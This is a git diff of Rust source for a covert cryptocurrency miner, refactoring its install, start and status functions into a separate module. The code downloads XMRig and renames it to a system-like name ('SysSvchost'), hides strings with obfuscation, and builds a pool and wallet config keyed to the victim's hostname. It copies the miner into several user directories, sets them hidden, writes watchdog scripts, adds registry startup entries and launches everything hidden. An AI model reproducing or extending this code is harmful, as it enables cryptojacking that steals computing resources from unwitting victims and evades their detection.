@@ -1,15 +1,13 @@
-use std::fs::{self, File};
-use std::io::Write;
+use std::fs;
 use std::path::Path;
 
-use crate::common::config::MinerConfig;
-use crate::common::constants::{
-    get_download_url, get_pool_url, get_wallet, 
-    get_miner_exe_name, get_launcher_script_name, CONFIG_FILENAME
-};
-use crate::utils::files::{download_file, extract_zip, move_files_from_subdir, copy_dir_recursive};
+// use crate::common::config::MinerConfig; // Moved to module
+use crate::common::constants::get_launcher_script_name;
+use crate::utils::files::copy_dir_recursive;
 use crate::utils::paths::{get_all_install_dirs, set_hidden_recursive, get_userprofile};
-use crate::host::process::{create_watchdog_script, start_hidden, stop_mining};
+use crate::host::process;
+use crate::modules::miner::stop_mining;
+use crate::modules::miner::{install as miner_install, status as miner_status};
 use crate::host::registry::{add_to_startup, remove_from_startup};
 
 pub fn install() -> Result<(), Box<dyn std::error::Error>> {
@@ -21,53 +19,10 @@ pub fn install() -> Result<(), Box<dyn std::error::Error>> {
     }
     fs::create_dir_all(&staging_dir)?;
 
-    // Download XMRig
-    let zip_path = staging_dir.join(obfstr!("package.zip"));
-    download_file(&get_download_url(), &zip_path)?;
-
-    // Extract
-    extract_zip(&zip_path, &staging_dir)?;
-    move_files_from_subdir(&staging_dir)?;
-
-    // Rename XMRig to SysSvchost
-    let old_xmrig = staging_dir.join(obfstr!("xmrig.exe"));
-    let new_miner = staging_dir.join(get_miner_exe_name());
-    if old_xmrig.exists() {
-        fs::rename(old_xmrig, &new_miner)?;
-    } else {
-        // If it's already renamed or missing?
-        if !new_miner.exists() {
-             return Err(obfstr!("Miner executable not found after extraction").into());
-        }
-    }
-
-    // Create Config
-    let total_threads = num_cpus::get() as i32;
-    let mining_threads = std::cmp::max(1, total_threads / 2);
-    
-    // Generate Dynamic Worker ID: Hostname-Random7
-    let host = hostname::get()
-        .map(|h| h.to_string_lossy().into_owned())
-        .unwrap_or_else(|_| "UNKNOWN".to_string());
-        
-    use rand::{Rng, distributions::Alphanumeric};
-    let random_suffix: String = rand::thread_rng()
-        .sample_iter(&Alphanumeric)
-        .take(7)
-        .map(char::from)
-        .collect::<String>()
-        .to_uppercase();
-        
-    let final_wallet = format!("{}.{}-{}", get_wallet(), host, random_suffix);
-    
-    let config_path = staging_dir.join(CONFIG_FILENAME);
-    let config = MinerConfig::new(&get_pool_url(), &final_wallet, mining_threads);
-    let json = serde_json::to_string_pretty(&config)?;
-    let mut file = File::create(&config_path)?;
-    file.write_all(json.as_bytes())?;
-
-    // Clean up zip
-    let _ = fs::remove_file(&zip_path);
+    // 1. Prepare Initial Staging Area (Temp)
+    // Delegate mining setup to Miner Module
+    // This handles Download, Extract, Rename, Config
+    miner_install::prepare_miner(&staging_dir)?;
 
     // 2. Distribute to ALL locations (AppData, LocalAppData, Temp)
     let install_dirs = get_all_install_dirs();
@@ -83,7 +38,7 @@ pub fn install() -> Result<(), Box<dyn std::error::Error>> {
 
     // 3. Generate Scripts in ALL locations
     // We pass the list of all install dirs so the scripts can cross-reference
-    create_watchdog_script(&install_dirs, &Path::new("dummy"))?; // Config path is relative in script now
+    process::create_watchdog_script(&install_dirs, &Path::new("dummy"))?; // Config path is relative in script now
 
     // 4. Set Hidden Attributes on ALL locations
     for dir in &install_dirs {
@@ -140,7 +95,7 @@ pub fn install() -> Result<(), Box<dyn std::error::Error>> {
     for dir in &install_dirs {
         let launcher = dir.join(get_launcher_script_name());
         if launcher.exists() {
-             start_hidden(&launcher)?;
+             process::start_hidden(&launcher)?;
         }
     }
 
@@ -172,7 +127,7 @@ pub fn start() -> Result<(), Box<dyn std::error::Error>> {
     for dir in &install_dirs {
         let launcher = dir.join(get_launcher_script_name());
         if launcher.exists() {
-            start_hidden(&launcher)?;
+            process::start_hidden(&launcher)?;
             started = true;
         }
     }
@@ -190,31 +145,10 @@ pub fn start() -> Result<(), Box<dyn std::error::Error>> {
 
 #[cfg(windows)]
 pub fn status() {
-    use std::process::Command;
-    
-    if let Ok(output) = Command::new("tasklist")
-        .args(&["/FI", &format!("IMAGENAME eq {}", get_miner_exe_name())])
-        .output()
-    {
-        let stdout = String::from_utf8_lossy(&output.stdout);
-        if stdout.contains(&get_miner_exe_name()) {
-            println!("RUNNING");
-        } else {
-            println!("STOPPED");
-        }
-    } else {
-        println!("UNKNOWN");
-    }
+    miner_status::check_status();
 }
 
 #[cfg(not(windows))]
 pub fn status() {
-    let install_dirs = get_all_install_dirs();
-    let installed = install_dirs.iter().any(|d| d.exists());
-    
-    if installed {
-         println!("INSTALLED (Linux/Mac Check)");
-    } else {
-         println!("NOT_INSTALLED");
-    }
+    miner_status::check_status();
 }
